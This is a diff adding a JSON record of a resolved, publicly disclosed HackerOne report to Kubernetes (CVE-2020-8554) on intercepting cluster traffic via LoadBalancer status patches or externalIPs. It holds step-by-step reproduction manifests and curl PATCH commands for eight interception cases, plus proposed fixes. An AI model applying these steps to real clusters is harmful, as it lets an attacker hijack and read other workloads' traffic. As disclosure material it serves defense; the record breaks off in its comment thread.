@@ -1,0 +1,1414 @@
+{
+  "id": 764986,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjQ5ODY=",
+  "url": "https://hackerone.com/reports/764986",
+  "title": "Man in the middle using LoadBalancer or ExternalIPs services",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-27T06:05:35.114Z",
+  "submitted_at": "2019-12-27T06:05:35.114Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "champtar",
+    "url": "/champtar",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8554"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-11-04T18:09:23.199Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-10-08T03:49:20.983Z",
+  "team_member_agreed_on_going_public_at": "2021-11-04T18:09:23.041Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I rated this vulnerability as high because trying to rate it with CVSS v3.0 Calculator gives me 9.9 which seems way too high  as you do require to be able to create services in the K8S cluster.\n\n## Summary:\nThis report details 2 ways to man in the middle traffic by:\na) creating a LoadBalancer service and patching the status with the attacked IP\nb) creating a ClusterIP service with ExternalIPs set to the attacked IP\n\nFor these 2 options, we explore:\n1) MITM of IPs external to the cluster (ex: 1.1.1.1)\n2) MITM of ClusterIP IP\n3) MITM of pod IP\n4) MITM of 127.0.0.1\n\nThis gives us 8 test cases, that I tested with kube-proxy mode IPVS, iptables, and a GKE cluster (if you need an easier repro than kubespray deployments)\n\nResults are: {F669473}\n\n## Kubernetes Version:\n```\nv1.16.3 deployed using kubespray\n1.15.4-gke.22 for the GKE cluster\n```\n\n## Component Version:\nTest cluster deployed on top of CentOS7 using kubespray v2.12.0\n```\ncontainer_manager: containerd\netcd_deployment_type: host\nkube_proxy_mode: ipvs OR kube_proxy_mode: iptables\n\n# kubectl get nodes -o wide\nNAME            STATUS   ROLES    AGE   VERSION   INTERNAL-IP    EXTERNAL-IP   OS-IMAGE                KERNEL-VERSION               CONTAINER-RUNTIME\netienne-ks141   Ready    master   48m   v1.16.3   10.10.52.141   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\netienne-ks142   Ready    master   47m   v1.16.3   10.10.52.142   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\netienne-ks143   Ready    <none>   45m   v1.16.3   10.10.52.143   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\netienne-ks144   Ready    <none>   45m   v1.16.3   10.10.52.144   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\n\nCalico 3.7.3\nCNI plugin 0.8.1\n```\n\n## Steps To Reproduce:\n\nWe assume that you already have a working k8s cluster\n\n### 0) prepare our tests\n\nDeploy \"victim-client\" pod to simulate an in-cluster HTTP client with curl\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: victim-client\nspec:\n  containers:\n    - name: curl\n      image: curlimages/curl:7.67.0\n      command: [ \"/bin/sleep\", \"3600\" ]\nEOF\n```\n\nCheck that we have access to our external victim (here 1.1.1.1)\n```\n# from a node\ncurl -sv http://1.1.1.1\ncurl -sv https://1.1.1.1 -k\n# from the pod\nkubectl exec victim-client -- curl -sv http://1.1.1.1\nkubectl exec victim-client -- curl -sv https://1.1.1.1 -k\n```\nDeploy our \"mitm pod\"\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: kubeproxy-mitm\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: kubeproxy-mitm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoserver\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.10\n        name: echoserver\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: https\n          containerPort: 8443\nEOF\n```\n\n### 1a) external traffic interception using service type LoadBalancer\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-external-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8080\n  - name: https\n    port: 443\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-external-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"1.1.1.1\"}]}}}'\npkill kubectl\n```\nAfter the patch call, LoadBalancer IP is properly configured (ie not pending)\n```\nkubectl get -n kubeproxy-mitm svc/mitm-external-lb\n# NAME               TYPE           CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE\n# mitm-external-lb   LoadBalancer   10.233.53.58   1.1.1.1       80:31475/TCP,443:31258/TCP   47s\n```\nTest if the MITM works\n```\n# node -> ip\ncurl -sv http://1.1.1.1\ncurl -sv https://1.1.1.1 -k\n# pod -> ip\nkubectl exec victim-client -- curl -sv http://1.1.1.1\nkubectl exec victim-client -- curl -sv https://1.1.1.1 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-external-lb\n```\n\n### 1b) external traffic interception using service type ClusterIP + externalIPs\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-external-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8080\n  - name: https\n    port: 443\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 1.1.1.1\nEOF\n```\nTest if the MITM works\n```\n# node -> ip\ncurl -sv http://1.1.1.1\ncurl -sv https://1.1.1.1 -k\n# pod -> ip\nkubectl exec victim-client -- curl -sv http://1.1.1.1\nkubectl exec victim-client -- curl -sv https://1.1.1.1 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-external-eip\n```\n\n### 2a) k8s service traffic interception using service type LoadBalancer\n\nFind a service to attack, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   87m\n```\nTest if the service is working\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-service-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-service-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"10.233.36.240\"}]}}}'\npkill kubectl\n```\nTest if the MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-service-lb\n```\n\n### 2b) k8s service traffic interception using service type ClusterIP + externalIPs\n\nFind a service to attack, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   87m\n```\nTest if the service is working before the MITM\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-service-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 10.233.36.240\nEOF\n```\nTest if MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-service-eip\n```\n\n### 3a) k8s pod traffic interception using service type LoadBalancer\n\nFind a service to attack + its endpoints, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   42m\n\nkubectl get -n kube-system endpoints kubernetes-dashboard\n# NAME                   ENDPOINTS           AGE\n# kubernetes-dashboard   10.233.115.2:8443   9h\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-pod-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  - name: https2\n    port: 8443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-pod-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"10.233.115.2\"}]}}}'\npkill kubectl\n```\nTest if MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n# node -> endpoint\ncurl -sv https://10.233.115.2:8443 -k\n# pod -> endpoint\nkubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-pod-lb\n```\n\n### 3b) k8s pod traffic interception using service type ClusterIP + externalIPs\n\nFind a service to attack + its endpoints, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   42m\n\nkubectl get -n kube-system endpoints kubernetes-dashboard\n# NAME                   ENDPOINTS           AGE\n# kubernetes-dashboard   10.233.115.2:8443   9h\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-pod-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  - name: https2\n    port: 8443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 10.233.115.2\nEOF\n```\nTest if MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n# node -> endpoint\ncurl -sv https://10.233.115.2:8443 -k\n# pod -> endpoint\nkubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-pod-eip\n```\n\n### 4a) node localhost traffic interception using service type LoadBalancer\n\n(This might also work against a container with hostNetwork=true)\n\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-local-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: smtp\n    port: 25\n    protocol: TCP\n    targetPort: 8080\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: 8080\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-local-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"127.0.0.1\"}]}}}'\npkill kubectl\n```\n\nOn my CentOS7 there is postfix listening on 127.0.0.1:25 (thus the test with port 25)\nTest if the MITM works\n```\ncurl http://127.0.0.1:25\ncurl http://127.0.0.1\ncurl https://127.0.0.1 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-local-lb\n```\n\n### 4b) node localhost traffic interception using service type ClusterIP + externalIPs\n\nTry to deploy our MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-local-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 127.0.0.1\nEOF\n```\nThis one fails with\n```\nThe Service \"mitm-local-eip\" is invalid: spec.externalIPs[0]: Invalid value: \"127.0.0.1\": may not be in the loopback range (127.0.0.0/8)\n```\n\n## Additional informations:\n\nThis work doesn't claim to be exhaustive, here are some limitations:\n- I didn't attempt to MITM DNS traffic, as it's UDP, it might behave differently than TCP, but pretty sure it works in some cases\n- I didn't try to reproduce my findings with other kube-proxy replacements (Cilium, ...)\n- I didn't try to reproduce my findings with Network policies configured\n- I didn't try to reproduce my findings with services mesh encryption like Istio\n- I didn't try multiple CNI\n- I didn't look at IPv6\n- I didn't try to MITM Loadbalancer IPs with external IPs and vice versa\n- I didn't fully investigate if having a service that changes ports (443->8443) makes a difference versus a service that doesn't (443->443)\n\nIssues 2/3/4 could be fixed via a blacklist approach, at the API level, loadBalancerIP and externalIPs must not be allowed in the same range as clusterIPs, pods IPs, localhost, nodeIPs, and maybe some other reserved ranged.\n\nIssues 1a/1b are expected behaviours in my opinion. I want to be able to access my LoadBalancer IP from my pods and nodes, so a possible fix here would be a whitelist, and give the rights to real LB controllers to update this whitelist.\n\nWe also need to make sure we can't use the same IP as both Loadbalancer IP and external IP.\n\n## Supporting Material/References:\n\nBoth kube-proxy config attached\n\nCommand line to create the test GKE cluster:\n```\ngcloud beta container --project \"my-project\" clusters create \"kubeproxy-tests\" --zone \"us-central1-a\" --no-enable-basic-auth --cluster-version \"1.15.4-gke.22\" --machine-type \"n1-standard-2\" --image-type \"COS\" --disk-type \"pd-standard\" --disk-size \"100\" --metadata disable-legacy-endpoints=true --scopes \"https://www.googleapis.com/auth/devstorage.read_only\",\"https://www.googleapis.com/auth/logging.write\",\"https://www.googleapis.com/auth/monitoring\",\"https://www.googleapis.com/auth/servicecontrol\",\"https://www.googleapis.com/auth/service.management.readonly\",\"https://www.googleapis.com/auth/trace.append\" --num-nodes \"3\" --enable-stackdriver-kubernetes --no-enable-ip-alias --network \"projects/copper-frame-263204/global/networks/default\" --subnetwork \"projects/copper-frame-263204/regions/us-central1/subnetworks/default\" --addons HorizontalPodAutoscaling,HttpLoadBalancing --enable-autoupgrade --enable-autorepair\n```\nFor GKE I used \"metrics-server\" instead of \"kubernetes-dashboard\" as victim service\n\n## Impact\n\nAn attacker able to create and/or patch services can, depending on the mode of kube-proxy:\n- MITM traffic destined for IPs external to the cluster (ex: 1.1.1.1)\n- MITM traffic destined for ClusterIP IP\n- MITM traffic destined for pod IP\n- MITM traffic destined for 127.0.0.1",
+  "weakness": {
+    "id": 30,
+    "name": "Man-in-the-Middle"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 669473,
+      "file_name": "Capture_d__cran_du_2019-12-26_20-20-23.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4sQpNaC7Dx7LHA3P9JyrtAZz?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2019-12-26_20-20-23.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2019-12-26_20-20-23.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fa80099e6e69e4b3ca4223ee11468473a8a7e86b4284238c3b005ab495986e72",
+      "file_size": 49354,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 669483,
+      "file_name": "kubeproxy.ipvs.conf",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Etepgw8foKZNeJhj84jFbGbm?response-content-disposition=attachment%3B%20filename%3D%22kubeproxy.ipvs.conf%22%3B%20filename%2A%3DUTF-8%27%27kubeproxy.ipvs.conf&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=79247667ea2d2f994d0ac1e1b3d766e6f68c472a6b3b92c5762c4183adb1b599",
+      "file_size": 971,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 669493,
+      "file_name": "kubeproxy.iptables.conf",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RcCFRo2RiogRkKTpc526MiJ6?response-content-disposition=attachment%3B%20filename%3D%22kubeproxy.iptables.conf%22%3B%20filename%2A%3DUTF-8%27%27kubeproxy.iptables.conf&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=76d059dfa8afe8b48688602d8ad2dfbc67d9e494a33cc73caf4d6d6575818ae7",
+      "file_size": 975,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-11-07T03:49:21.062Z",
+  "allow_singular_disclosure_after": -59195911.356757075,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "ali",
+    "meispi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32490,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/kube-proxy",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 6635969,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @champtar - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share. ",
+      "automated_response": false,
